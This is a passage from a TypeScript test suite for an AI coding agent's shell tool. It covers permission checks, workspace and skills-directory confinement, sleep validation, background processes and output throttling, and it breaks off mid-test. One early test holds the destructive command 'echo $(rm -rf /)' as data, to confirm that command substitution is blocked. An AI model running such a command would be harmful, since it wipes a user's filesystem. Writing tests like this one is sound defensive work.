/**
 * @license
 * Copyright 2025 Google LLC
 * SPDX-License-Identifier: Apache-2.0
 */

import {
  vi,
  describe,
  it,
  expect,
  beforeEach,
  afterEach,
  type Mock,
} from 'vitest';

const mockShellExecutionService = vi.hoisted(() => vi.fn());
vi.mock('../services/shellExecutionService.js', () => ({
  ShellExecutionService: { execute: mockShellExecutionService },
}));
vi.mock('fs');
vi.mock('os');
vi.mock('crypto');

import { isCommandAllowed } from '../utils/shell-utils.js';
import { ShellTool, type ShellToolInvocation } from './shell.js';
import { detectBlockedSleepPattern } from './shell.js';
import { stripShellWrapper } from '../utils/shell-utils.js';
import { type Config } from '../config/config.js';
import {
  type ShellExecutionResult,
  type ShellOutputEvent,
} from '../services/shellExecutionService.js';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as crypto from 'node:crypto';
import { ToolErrorType } from './tool-error.js';
import { OUTPUT_UPDATE_INTERVAL_MS, parseNumstat } from './shell.js';
import { createMockWorkspaceContext } from '../test-utils/mockWorkspaceContext.js';
import { PermissionManager } from '../permissions/permission-manager.js';
import { CommitAttributionService } from '../services/commitAttribution.js';

interface ShellToolParameterJsonSchema {
  properties: {
    command: {
      description: string;
    };
  };
}

function getCommandParameterDescription(shellTool: ShellTool): string {
  return (shellTool.schema.parametersJsonSchema as ShellToolParameterJsonSchema)
    .properties.command.description;
}

describe('ShellTool', () => {
  let shellTool: ShellTool;
  let mockConfig: Config;
  let mockShellOutputCallback: (event: ShellOutputEvent) => void;
  let resolveExecutionPromise: (result: ShellExecutionResult) => void;

  beforeEach(() => {
    vi.clearAllMocks();

    mockConfig = {
      getCoreTools: vi.fn().mockReturnValue([]),
      getPermissionsAllow: vi.fn().mockReturnValue([]),
      getPermissionsAsk: vi.fn().mockReturnValue([]),
      getPermissionsDeny: vi.fn().mockReturnValue([]),
      getDebugMode: vi.fn().mockReturnValue(false),
      getTargetDir: vi.fn().mockReturnValue('/test/dir'),
      getSessionId: vi.fn().mockReturnValue('test-session'),
      getWorkspaceContext: vi
        .fn()
        .mockReturnValue(createMockWorkspaceContext('/test/dir')),
      storage: {
        getUserSkillsDirs: vi.fn().mockReturnValue(['/test/dir/.qwen/skills']),
        getProjectTempDir: vi.fn().mockReturnValue('/tmp/qwen-temp'),
        getProjectDir: vi.fn().mockReturnValue('/test/proj'),
      },
      getTruncateToolOutputThreshold: vi.fn().mockReturnValue(0),
      getTruncateToolOutputLines: vi.fn().mockReturnValue(0),
      getPermissionManager: vi.fn().mockReturnValue(undefined),
      getGeminiClient: vi.fn(),
      getModel: vi.fn().mockReturnValue('qwen3-coder-plus'),
      getGitCoAuthor: vi.fn().mockReturnValue({
        commit: true,
        pr: true,
        name: 'Qwen-Coder',
        email: 'qwen-coder@alibabacloud.com',
      }),
      getShouldUseNodePtyShell: vi.fn().mockReturnValue(false),
      getBackgroundShellRegistry: vi.fn().mockReturnValue({
        register: vi.fn(),
        get: vi.fn(),
        getAll: vi.fn().mockReturnValue([]),
        cancel: vi.fn(),
        complete: vi.fn(),
        fail: vi.fn(),
      }),
    } as unknown as Config;

    // executeBackground writes to disk; stub mkdirSync + createWriteStream.
    vi.mocked(fs.mkdirSync).mockReturnValue(undefined);
    vi.mocked(fs.createWriteStream).mockReturnValue({
      write: vi.fn(),
      end: vi.fn(),
      on: vi.fn(),
    } as unknown as fs.WriteStream);

    vi.mocked(os.platform).mockReturnValue('linux');
    vi.mocked(os.tmpdir).mockReturnValue('/tmp');
    (vi.mocked(crypto.randomBytes) as Mock).mockReturnValue(
      Buffer.from('abcdef', 'hex'),
    );

    shellTool = new ShellTool(mockConfig);

    // Capture the output callback to simulate streaming events from the service
    mockShellExecutionService.mockImplementation((_cmd, _cwd, callback) => {
      mockShellOutputCallback = callback;
      return {
        pid: 12345,
        result: new Promise((resolve) => {
          resolveExecutionPromise = resolve;
        }),
      };
    });

    // Ensure attribution singleton is clean between tests
    CommitAttributionService.resetInstance();
  });

  describe('isCommandAllowed', () => {
    it('should allow a command if no restrictions are provided', async () => {
      (mockConfig.getCoreTools as Mock).mockReturnValue(undefined);
      (mockConfig.getPermissionsDeny as Mock).mockReturnValue(undefined);
      expect((await isCommandAllowed('ls -l', mockConfig)).allowed).toBe(true);
    });

    it('should block a command with command substitution using $()', async () => {
      expect(
        (await isCommandAllowed('echo $(rm -rf /)', mockConfig)).allowed,
      ).toBe(false);
    });
  });

  describe('build', () => {
    it('should return an invocation for a valid command', async () => {
      const invocation = shellTool.build({
        command: 'ls -l',
        is_background: false,
      });
      expect(invocation).toBeDefined();
    });

    it('should throw an error for an empty command', async () => {
      expect(() =>
        shellTool.build({ command: ' ', is_background: false }),
      ).toThrow('Command cannot be empty.');
    });

    it('should mention the intentional sleep escape hatch when blocking sleep', async () => {
      const error = shellTool.validateToolParams({
        command: 'sleep 5',
        is_background: false,
      });

      expect(error).toContain('intentional-sleep:');
    });

    it('should explain rejected intentional sleep comments', async () => {
      const shortReasonError = shellTool.validateToolParams({
        command: 'sleep 5 # intentional-sleep: wait',
        is_background: false,
      });
      const overCapError = shellTool.validateToolParams({
        command:
          'sleep 601s # intentional-sleep: wait for MCP rate limit reset',
        is_background: false,
      });

      expect(shortReasonError).toContain('reason is too short');
      expect(shortReasonError).not.toContain('add a trailing comment like');
      expect(overCapError).toContain('foreground sleeps over 10 minutes');
      expect(overCapError).not.toContain('add a trailing comment like');
    });

    it('should throw an error for a relative directory path', async () => {
      expect(() =>
        shellTool.build({
          command: 'ls',
          directory: 'rel/path',
          is_background: false,
        }),
      ).toThrow('Directory must be an absolute path.');
    });

    it('should throw an error for a directory outside the workspace', async () => {
      (mockConfig.getWorkspaceContext as Mock).mockReturnValue(
        createMockWorkspaceContext('/test/dir', ['/another/workspace']),
      );
      expect(() =>
        shellTool.build({
          command: 'ls',
          directory: '/not/in/workspace',
          is_background: false,
        }),
      ).toThrow(
        "Directory '/not/in/workspace' is not within any of the registered workspace directories.",
      );
    });

    it('should throw an error for a directory within the user skills directory', async () => {
      expect(() =>
        shellTool.build({
          command: 'ls',
          directory: '/test/dir/.qwen/skills/my-skill',
          is_background: false,
        }),
      ).toThrow(
        'Explicitly running shell commands from within the user skills directory is not allowed. Please use absolute paths for command parameter instead.',
      );
    });

    it('should throw an error for the user skills directory itself', async () => {
      expect(() =>
        shellTool.build({
          command: 'ls',
          directory: '/test/dir/.qwen/skills',
          is_background: false,
        }),
      ).toThrow(
        'Explicitly running shell commands from within the user skills directory is not allowed. Please use absolute paths for command parameter instead.',
      );
    });

    it('should resolve directory path before checking user skills directory', async () => {
      expect(() =>
        shellTool.build({
          command: 'ls',
          directory: '/test/dir/.qwen/skills/../skills/my-skill',
          is_background: false,
        }),
      ).toThrow(
        'Explicitly running shell commands from within the user skills directory is not allowed. Please use absolute paths for command parameter instead.',
      );
    });

    it('should return an invocation for a valid absolute directory path', async () => {
      (mockConfig.getWorkspaceContext as Mock).mockReturnValue(
        createMockWorkspaceContext('/test/dir', ['/another/workspace']),
      );
      const invocation = shellTool.build({
        command: 'ls',
        directory: '/test/dir/subdir',
        is_background: false,
      });
      expect(invocation).toBeDefined();
    });

    it('should include background indicator in description when is_background is true', async () => {
      const invocation = shellTool.build({
        command: 'npm start',
        is_background: true,
      });
      expect(invocation.getDescription()).toContain('[background]');
    });

    it('should not include background indicator in description when is_background is false', async () => {
      const invocation = shellTool.build({
        command: 'npm test',
        is_background: false,
      });
      expect(invocation.getDescription()).not.toContain('[background]');
    });

    describe('is_background parameter coercion', () => {
      it('should accept string "true" as boolean true', async () => {
        const invocation = shellTool.build({
          command: 'npm run dev',
          is_background: 'true' as unknown as boolean,
        });
        expect(invocation).toBeDefined();
        expect(invocation.getDescription()).toContain('[background]');
      });

      it('should accept string "false" as boolean false', async () => {
        const invocation = shellTool.build({
          command: 'npm run build',
          is_background: 'false' as unknown as boolean,
        });
        expect(invocation).toBeDefined();
        expect(invocation.getDescription()).not.toContain('[background]');
      });

      it('should accept string "True" as boolean true', async () => {
        const invocation = shellTool.build({
          command: 'npm run dev',
          is_background: 'True' as unknown as boolean,
        });
        expect(invocation).toBeDefined();
        expect(invocation.getDescription()).toContain('[background]');
      });

      it('should accept string "False" as boolean false', async () => {
        const invocation = shellTool.build({
          command: 'npm run build',
          is_background: 'False' as unknown as boolean,
        });
        expect(invocation).toBeDefined();
        expect(invocation.getDescription()).not.toContain('[background]');
      });
    });
  });

  describe('execute', () => {
    const mockAbortSignal = new AbortController().signal;

    const resolveShellExecution = (
      result: Partial<ShellExecutionResult> = {},
    ) => {
      const fullResult: ShellExecutionResult = {
        rawOutput: Buffer.from(result.output || ''),
        output: 'Success',
        exitCode: 0,
        signal: null,
        error: null,
        aborted: false,
        pid: 12345,
        executionMethod: 'child_process',
        ...result,
      };
      resolveExecutionPromise(fullResult);
    };

    it('runs background commands as managed pool entries (no & / pgrep wrap)', async () => {
      const registry = mockConfig.getBackgroundShellRegistry();
      const invocation = shellTool.build({
        command: 'npm start',
        is_background: true,
      });

      const result = await invocation.execute(mockAbortSignal);

      // Spawn happens with the unwrapped command — no '&', no pgrep envelope.
      // Streaming mode is on so dev-server / watcher output flushes to the
      // output file as it arrives instead of buffering until exit.
      expect(mockShellExecutionService).toHaveBeenCalledWith(
        'npm start',
        '/test/dir',
        expect.any(Function),
        expect.any(AbortSignal),
        false,
        expect.objectContaining({}),
        { streamStdout: true },
      );
      // Entry registered with the spawn pid.
      expect(registry.register).toHaveBeenCalledTimes(1);
      const entry = (registry.register as Mock).mock.calls[0][0];
      expect(entry.command).toBe('npm start');
      expect(entry.cwd).toBe('/test/dir');
      expect(entry.status).toBe('running');
      expect(entry.pid).toBe(12345);
      expect(typeof entry.shellId).toBe('string');
      expect(entry.outputPath).toContain('shell-');
      // Returns immediately with id + output path; agent's turn isn't blocked.
      expect(result.llmContent).toContain(entry.shellId);
      expect(result.llmContent).toContain(entry.outputPath);
    });

    it('settles a background entry as completed when the process exits cleanly', async () => {
      const registry = mockConfig.getBackgroundShellRegistry();
      const invocation = shellTool.build({
        command: 'true',
        is_background: true,
      });
      await invocation.execute(mockAbortSignal);
      const entry = (registry.register as Mock).mock.calls[0][0];

      resolveExecutionPromise({
        rawOutput: Buffer.from(''),
        output: '',
        exitCode: 0,
        signal: null,
        error: null,
        aborted: false,
        pid: 12345,
        executionMethod: 'child_process',
      });
      // Flush the .then() microtask attached to resultPromise.
      await new Promise((r) => setImmediate(r));

      expect(registry.complete).toHaveBeenCalledWith(
        entry.shellId,
        0,
        expect.any(Number),
      );
      expect(registry.fail).not.toHaveBeenCalled();
      expect(registry.cancel).not.toHaveBeenCalled();
    });

    it('settles a background entry as failed when ShellExecutionService reports error', async () => {
      const registry = mockConfig.getBackgroundShellRegistry();
      const invocation = shellTool.build({
        command: 'no-such-command',
        is_background: true,
      });
      await invocation.execute(mockAbortSignal);
      const entry = (registry.register as Mock).mock.calls[0][0];

      resolveExecutionPromise({
        rawOutput: Buffer.from(''),
        output: '',
        exitCode: null,
        signal: null,
        error: new Error('spawn ENOENT'),
        aborted: false,
        pid: 12345,
        executionMethod: 'child_process',
      });
      await new Promise((r) => setImmediate(r));

      expect(registry.fail).toHaveBeenCalledWith(
        entry.shellId,
        'spawn ENOENT',
        expect.any(Number),
      );
      expect(registry.complete).not.toHaveBeenCalled();
    });

    it('settles a background entry as failed on non-zero exit code (no error object)', async () => {
      const registry = mockConfig.getBackgroundShellRegistry();
      const invocation = shellTool.build({
        command: 'false',
        is_background: true,
      });
      await invocation.execute(mockAbortSignal);
      const entry = (registry.register as Mock).mock.calls[0][0];

      // ShellExecutionService reports a clean non-zero exit (no error object,
      // no signal) — historically this got bucketed as `completed`, which
      // misreported a failed `npm test` / `false` as a success.
      resolveExecutionPromise({
        rawOutput: Buffer.from(''),
        output: '',
        exitCode: 1,
        signal: null,
        error: null,
        aborted: false,
        pid: 12345,
        executionMethod: 'child_process',
      });
      await new Promise((r) => setImmediate(r));

      expect(registry.fail).toHaveBeenCalledWith(
        entry.shellId,
        expect.stringContaining('exited with code 1'),
        expect.any(Number),
      );
      expect(registry.complete).not.toHaveBeenCalled();
    });

    it('rejects a bare trailing & in managed background mode', async () => {
      expect(() =>
        shellTool.build({
          command: 'node server.js &',
          is_background: true,
        }),
      ).toThrow(
        'Background shell commands must not end with a bare "&". Remove the trailing "&" and rely on is_background: true instead.',
      );
      expect(mockShellExecutionService).not.toHaveBeenCalled();
    });

    it('rejects wrapped bash commands whose stripped payload ends with bare &', async () => {
      expect(() =>
        shellTool.build({
          command: 'bash -c "node server.js &"',
          is_background: true,
        }),
      ).toThrow(
        'Background shell commands must not end with a bare "&". Remove the trailing "&" and rely on is_background: true instead.',
      );
      expect(mockShellExecutionService).not.toHaveBeenCalled();
    });

    it('rejects wrapped sh commands whose stripped payload ends with bare &', async () => {
      expect(() =>
        shellTool.build({
          command: "sh -c 'npm run dev &'",
          is_background: true,
        }),
      ).toThrow(
        'Background shell commands must not end with a bare "&". Remove the trailing "&" and rely on is_background: true instead.',
      );
      expect(mockShellExecutionService).not.toHaveBeenCalled();
    });

    it('preserves a trailing && (logical AND would be syntactically broken otherwise)', async () => {
      const invocation = shellTool.build({
        command: 'npm run dev &&',
        is_background: true,
      });
      await invocation.execute(mockAbortSignal);
      expect(mockShellExecutionService).toHaveBeenCalledWith(
        'npm run dev &&',
        expect.any(String),
        expect.any(Function),
        expect.any(AbortSignal),
        false,
        expect.objectContaining({}),
        { streamStdout: true },
      );
    });

    it('preserves an escaped trailing \\& (literal &)', async () => {
      const invocation = shellTool.build({
        command: 'echo foo \\&',
        is_background: true,
      });
      await invocation.execute(mockAbortSignal);
      expect(mockShellExecutionService).toHaveBeenCalledWith(
        'echo foo \\&',
        expect.any(String),
        expect.any(Function),
        expect.any(AbortSignal),
        false,
        expect.objectContaining({}),
        { streamStdout: true },
      );
    });

    it('preserves quoted trailing ampersands', async () => {
      const invocation = shellTool.build({
        command: `printf '&'`,
        is_background: true,
      });
      await invocation.execute(mockAbortSignal);
      expect(mockShellExecutionService).toHaveBeenCalledWith(
        `printf '&'`,
        expect.any(String),
        expect.any(Function),
        expect.any(AbortSignal),
        false,
        expect.objectContaining({}),
        { streamStdout: true },
      );
    });

    it('preserves ampersands inside double-quoted script arguments', async () => {
      const invocation = shellTool.build({
        command: `node -e "console.log('&')"`,
        is_background: true,
      });
      await invocation.execute(mockAbortSignal);
      expect(mockShellExecutionService).toHaveBeenCalledWith(
        `node -e "console.log('&')"`,
        expect.any(String),
        expect.any(Function),
        expect.any(AbortSignal),
        false,
        expect.objectContaining({}),
        { streamStdout: true },
      );
    });

    it('preserves ampersands inside command substitutions', async () => {
      const invocation = shellTool.build({
        command: `echo $(printf '&')`,
        is_background: true,
      });
      await invocation.execute(mockAbortSignal);
      expect(mockShellExecutionService).toHaveBeenCalledWith(
        `echo $(printf '&')`,
        expect.any(String),
        expect.any(Function),
        expect.any(AbortSignal),
        false,
        expect.objectContaining({}),
        { streamStdout: true },
      );
    });

    it('does not forward the turn signal into the background shell', async () => {
      // Verifies: the AbortSignal handed to ShellExecutionService is the
      // entry's own controller, not the outer turn signal. Cancelling the
      // turn must not kill an intentionally backgrounded dev server / watcher.
      const turnAc = new AbortController();
      const invocation = shellTool.build({
        command: 'npm run dev',
        is_background: true,
      });
      await invocation.execute(turnAc.signal);
      const passedSignal = mockShellExecutionService.mock.calls[0][3];
      expect(passedSignal).not.toBe(turnAc.signal);
      turnAc.abort();
      // The signal handed to ShellExecutionService stays un-aborted —
      // the turn's abort doesn't propagate into the background shell.
      expect(passedSignal.aborted).toBe(false);
    });

    it('should not add ampersand when is_background is false', async () => {
      const invocation = shellTool.build({
        command: 'npm test',
        is_background: false,
      });
      const promise = invocation.execute(mockAbortSignal);
      resolveShellExecution({ pid: 54321 });

      await promise;

      // Foreground commands should not be wrapped with pgrep
      expect(mockShellExecutionService).toHaveBeenCalledWith(
        'npm test',
        expect.any(String),
        expect.any(Function),
        expect.any(AbortSignal),
        false,
        expect.objectContaining({}),

        expect.objectContaining({ postPromote: expect.any(Object) }),
      );
    });

    it('preserves shell wrapper environment and flags during foreground execution', async () => {
      const command = `FOO=bar bash -e -c 'echo "$FOO"; false; echo bad'`;
      const invocation = shellTool.build({
        command,
        is_background: false,
      });
      const promise = invocation.execute(mockAbortSignal);
      resolveShellExecution();

      await promise;

      expect(mockShellExecutionService).toHaveBeenCalledWith(
        command,
        expect.any(String),
        expect.any(Function),
        expect.any(AbortSignal),
        false,
        expect.objectContaining({}),

        expect.objectContaining({ postPromote: expect.any(Object) }),
      );
    });

    it('preserves shell wrapper environment and flags during background execution', async () => {
      const command = `FOO=bar bash -e -c 'echo "$FOO"; sleep 10'`;
      const invocation = shellTool.build({
        command,
        is_background: true,
      });

      await invocation.execute(mockAbortSignal);

      expect(mockShellExecutionService).toHaveBeenCalledWith(
        command,
        expect.any(String),
        expect.any(Function),
        expect.any(AbortSignal),
        false,
        expect.objectContaining({}),
        { streamStdout: true },
      );
    });

    it('should use the provided directory as cwd', async () => {
      (mockConfig.getWorkspaceContext as Mock).mockReturnValue(
        createMockWorkspaceContext('/test/dir'),
      );
      const invocation = shellTool.build({
        command: 'ls',
        directory: '/test/dir/subdir',
        is_background: false,
      });
      const promise = invocation.execute(mockAbortSignal);
      resolveShellExecution();
      await promise;

      // Foreground commands should not be wrapped with pgrep
      expect(mockShellExecutionService).toHaveBeenCalledWith(
        'ls',
        '/test/dir/subdir',
        expect.any(Function),
        expect.any(AbortSignal),
        false,
        expect.objectContaining({}),

        expect.objectContaining({ postPromote: expect.any(Object) }),
      );
    });

    it('should not wrap command on windows', async () => {
      vi.mocked(os.platform).mockReturnValue('win32');
      const invocation = shellTool.build({
        command: 'dir',
        is_background: false,
      });
      const promise = invocation.execute(mockAbortSignal);
      resolveShellExecution({
        rawOutput: Buffer.from(''),
        output: '',
        exitCode: 0,
        signal: null,
        error: null,
        aborted: false,
        pid: 12345,
        executionMethod: 'child_process',
      });
      await promise;
      expect(mockShellExecutionService).toHaveBeenCalledWith(
        'dir',
        '/test/dir',
        expect.any(Function),
        expect.any(AbortSignal),
        false,
        expect.objectContaining({}),

        expect.objectContaining({ postPromote: expect.any(Object) }),
      );
    });

    it('should format error messages correctly', async () => {
      const error = new Error('wrapped command failed');
      const invocation = shellTool.build({
        command: 'user-command',
        is_background: false,
      });
      const promise = invocation.execute(mockAbortSignal);
      resolveShellExecution({
        error,
        exitCode: 1,
        output: 'err',
        rawOutput: Buffer.from('err'),
        signal: null,
        aborted: false,
        pid: 12345,
        executionMethod: 'child_process',
      });

      const result = await promise;
      expect(result.llmContent).toContain('Error: wrapped command failed');
      expect(result.llmContent).not.toContain('pgrep');
    });

    it('should return a SHELL_EXECUTE_ERROR for a command failure', async () => {
      const error = new Error('command failed');
      const invocation = shellTool.build({
        command: 'user-command',
        is_background: false,
      });
      const promise = invocation.execute(mockAbortSignal);
      resolveShellExecution({
        error,
        exitCode: 1,
      });

      const result = await promise;

      expect(result.error).toBeDefined();
      expect(result.error?.type).toBe(ToolErrorType.SHELL_EXECUTE_ERROR);
      expect(result.error?.message).toBe('command failed');
    });

    it('should throw an error for invalid parameters', async () => {
      expect(() =>
        shellTool.build({ command: '', is_background: false }),
      ).toThrow('Command cannot be empty.');
    });

    it('should throw an error for invalid directory', async () => {
      expect(() =>
        shellTool.build({
          command: 'ls',
          directory: 'nonexistent',
          is_background: false,
        }),
      ).toThrow('Directory must be an absolute path.');
    });

    describe('Streaming to `updateOutput`', () => {
      let updateOutputMock: Mock;
      beforeEach(() => {
        vi.useFakeTimers({ toFake: ['Date', 'setTimeout', 'clearTimeout'] });
        updateOutputMock = vi.fn();
      });
      afterEach(() => {
        vi.useRealTimers();
      });

      it('should immediately show binary detection message and throttle progress', async () => {
        const invocation = shellTool.build({
          command: 'cat img',
          is_background: false,
        });
        const promise = invocation.execute(mockAbortSignal, updateOutputMock);

        mockShellOutputCallback({ type: 'binary_detected' });
        expect(updateOutputMock).toHaveBeenCalledOnce();
        expect(updateOutputMock).toHaveBeenCalledWith(
          '[Binary output detected. Halting stream...]',
        );

        mockShellOutputCallback({
          type: 'binary_progress',
          bytesReceived: 1024,
        });
        expect(updateOutputMock).toHaveBeenCalledOnce();

        // Advance time past the throttle interval.
        await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS + 1);

        // Send a SECOND progress event. This one will trigger the flush.
        mockShellOutputCallback({
          type: 'binary_progress',
          bytesReceived: 2048,
        });

        // Now it should be called a second time with the latest progress.
        expect(updateOutputMock).toHaveBeenCalledTimes(2);
        expect(updateOutputMock).toHaveBeenLastCalledWith(
          '[Receiving binary output... 2.0 KB received]',
        );

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });
        await promise;
      });

      it('should throttle live text updates while preserving the latest output', async () => {
        const invocation = shellTool.build({
          command: 'npm test',
          is_background: false,
        });
        const promise = invocation.execute(mockAbortSignal, updateOutputMock);

        // Leading-edge fires immediately
        mockShellOutputCallback({ type: 'data', chunk: 'line 1' });
        expect(updateOutputMock).toHaveBeenCalledOnce();
        expect(updateOutputMock).toHaveBeenLastCalledWith('line 1');

        // Suppressed: trailing flush scheduled
        mockShellOutputCallback({ type: 'data', chunk: 'line 2' });
        expect(updateOutputMock).toHaveBeenCalledOnce();

        // Advance time: trailing flush fires, emitting 'line 2'
        await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS + 1);
        expect(updateOutputMock).toHaveBeenCalledTimes(2);
        expect(updateOutputMock).toHaveBeenLastCalledWith('line 2');

        // Advance time past the interval window again so next chunk fires immediately
        await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS + 1);

        mockShellOutputCallback({ type: 'data', chunk: 'line 3' });
        expect(updateOutputMock).toHaveBeenCalledTimes(3);
        expect(updateOutputMock).toHaveBeenLastCalledWith('line 3');

        resolveExecutionPromise({
          rawOutput: Buffer.from('line 1\nline 2\nline 3'),
          output: 'line 1\nline 2\nline 3',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });
        await promise;
      });

      it('should flush the last suppressed text chunk when the command goes quiet', async () => {
        const invocation = shellTool.build({
          command: 'long-running-cmd',
          is_background: false,
        });
        const promise = invocation.execute(mockAbortSignal, updateOutputMock);

        // Leading-edge update
        mockShellOutputCallback({ type: 'data', chunk: 'progress: 0%' });
        expect(updateOutputMock).toHaveBeenCalledOnce();

        // Suppressed: within the throttle window
        mockShellOutputCallback({ type: 'data', chunk: 'progress: 50%' });
        expect(updateOutputMock).toHaveBeenCalledOnce();

        // Advance time to trigger the trailing flush timer
        await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS + 1);

        // The trailing flush must have fired with the latest suppressed chunk
        expect(updateOutputMock).toHaveBeenCalledTimes(2);
        expect(updateOutputMock).toHaveBeenLastCalledWith('progress: 50%');

        resolveExecutionPromise({
          rawOutput: Buffer.from('progress: 50%'),
          output: 'progress: 50%',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });
        await promise;
      });

      it('should coalesce 3+ rapid text chunks within a window into a single trailing flush', async () => {
        // Regression: in one throttle window, the leading-edge chunk fires
        // immediately, and any subsequent chunks (regardless of count) are
        // collapsed into ONE trailing flush carrying the latest text. The
        // timer must not be repeatedly rescheduled per chunk — that would
        // be wasteful and (depending on the math) could push the flush
        // beyond the original window.
        const invocation = shellTool.build({
          command: 'streaming-cmd',
          is_background: false,
        });
        const promise = invocation.execute(mockAbortSignal, updateOutputMock);

        // Leading edge: fires immediately at t=0
        mockShellOutputCallback({ type: 'data', chunk: 'chunk 1' });
        expect(updateOutputMock).toHaveBeenCalledOnce();
        expect(updateOutputMock).toHaveBeenLastCalledWith('chunk 1');

        // Three rapid suppressed chunks within the same window. None of
        // these should fire updateOutput synchronously, and the trailing
        // flush should not have run yet.
        await vi.advanceTimersByTimeAsync(50);
        mockShellOutputCallback({ type: 'data', chunk: 'chunk 2' });
        await vi.advanceTimersByTimeAsync(50);
        mockShellOutputCallback({ type: 'data', chunk: 'chunk 3' });
        await vi.advanceTimersByTimeAsync(50);
        mockShellOutputCallback({ type: 'data', chunk: 'chunk 4' });
        expect(updateOutputMock).toHaveBeenCalledOnce();

        // Drain the throttle window. The single trailing flush should
        // fire exactly once and carry the LATEST suppressed chunk.
        await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS + 1);
        expect(updateOutputMock).toHaveBeenCalledTimes(2);
        expect(updateOutputMock).toHaveBeenLastCalledWith('chunk 4');

        resolveExecutionPromise({
          rawOutput: Buffer.from('chunk 1chunk 2chunk 3chunk 4'),
          output: 'chunk 1chunk 2chunk 3chunk 4',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });
        await promise;
      });

      it('should cancel a pending trailing flush when the command completes', async () => {
        // Lifecycle invariant: if the command resolves while a trailing
        // flush timer is pending, the timer MUST be cancelled. Otherwise
        // the timer would fire after `execute()` returns and trigger a
        // phantom updateOutput call against stale `cumulativeOutput`,
        // racing against the consumer that has already moved on.
        const invocation = shellTool.build({
          command: 'quick-cmd',
          is_background: false,
        });
        const promise = invocation.execute(mockAbortSignal, updateOutputMock);

        // Leading-edge update + suppressed chunk (timer pending)
        mockShellOutputCallback({ type: 'data', chunk: 'first' });
        expect(updateOutputMock).toHaveBeenCalledOnce();
        mockShellOutputCallback({ type: 'data', chunk: 'second' });
        expect(updateOutputMock).toHaveBeenCalledOnce();

        // Resolve BEFORE the throttle window elapses. No further chunks.
        resolveExecutionPromise({
          rawOutput: Buffer.from('first\nsecond'),
          output: 'first\nsecond',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });
        await promise;

        // Advancing time past the original window must not produce a
        // late updateOutput call — the timer was cancelled on settle.
        await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS * 2);
        expect(updateOutputMock).toHaveBeenCalledOnce();
      });

      it('should not fire a duplicate trailing flush after a leading-edge update', async () => {
        // After a trailing flush emits in window N, the next chunk in
        // window N+1 takes the leading-edge path. `doUpdate()` is the
        // single point that cancels any pending trailing-flush timer,
        // so even if a stale timer were somehow still scheduled when a
        // leading-edge update fires, no duplicate updateOutput call can
        // escape. This test asserts the end-to-end invariant: suppress
        // → trailing flush → leading-edge → suppress → trailing flush
        // produces exactly the expected sequence with no duplicates.
        const invocation = shellTool.build({
          command: 'multi-window-cmd',
          is_background: false,
        });
        const promise = invocation.execute(mockAbortSignal, updateOutputMock);

        // Window 1: leading-edge 'a' at t=0
        mockShellOutputCallback({ type: 'data', chunk: 'a' });
        expect(updateOutputMock).toHaveBeenCalledTimes(1);
        expect(updateOutputMock).toHaveBeenLastCalledWith('a');

        // Window 1: suppressed 'b' schedules trailing flush
        await vi.advanceTimersByTimeAsync(100);
        mockShellOutputCallback({ type: 'data', chunk: 'b' });
        expect(updateOutputMock).toHaveBeenCalledTimes(1);

        // Trailing flush fires at the window boundary with 'b'
        await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS);
        expect(updateOutputMock).toHaveBeenCalledTimes(2);
        expect(updateOutputMock).toHaveBeenLastCalledWith('b');

        // Window 2: advance past the interval, next chunk takes the
        // leading-edge path. If `doUpdate()` failed to cancel the (now
        // already-fired) timer, no harm; if doUpdate fails to cancel a
        // *future* timer scheduled later, we'd see duplicates below.
        await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS + 1);
        mockShellOutputCallback({ type: 'data', chunk: 'c' });
        expect(updateOutputMock).toHaveBeenCalledTimes(3);
        expect(updateOutputMock).toHaveBeenLastCalledWith('c');

        // Window 2: suppressed 'd' schedules another trailing flush
        await vi.advanceTimersByTimeAsync(50);
        mockShellOutputCallback({ type: 'data', chunk: 'd' });
        expect(updateOutputMock).toHaveBeenCalledTimes(3);

        // The trailing flush fires exactly once with 'd'.
        await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS);
        expect(updateOutputMock).toHaveBeenCalledTimes(4);
        expect(updateOutputMock).toHaveBeenLastCalledWith('d');

        // Drain a long quiet period — no spurious late updates from
        // any zombie timers.
        await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS * 5);
        expect(updateOutputMock).toHaveBeenCalledTimes(4);

        resolveExecutionPromise({
          rawOutput: Buffer.from('abcd'),
          output: 'abcd',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });
        await promise;
      });

      it('should cancel a pending trailing flush when the abort signal fires', async () => {
        // If the user cancels (or the timeout fires) while a trailing
        // flush is pending, the abort listener must cancel the timer.
        // Otherwise we'd flash a stale frame between the abort and the
        // result promise settling with `aborted: true`.
        const ac = new AbortController();
        const invocation = shellTool.build({
          command: 'sleep 1',
          is_background: false,
        });
        const promise = invocation.execute(ac.signal, updateOutputMock);

        // Leading-edge + suppressed (timer pending)
        mockShellOutputCallback({ type: 'data', chunk: 'partial' });
        expect(updateOutputMock).toHaveBeenCalledOnce();
        mockShellOutputCallback({ type: 'data', chunk: 'more partial' });
        expect(updateOutputMock).toHaveBeenCalledOnce();

        // Abort. The timer must be cancelled synchronously.
        ac.abort();

        // Drain the would-be window. updateOutput must NOT be called.
        await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS * 2);
        expect(updateOutputMock).toHaveBeenCalledOnce();

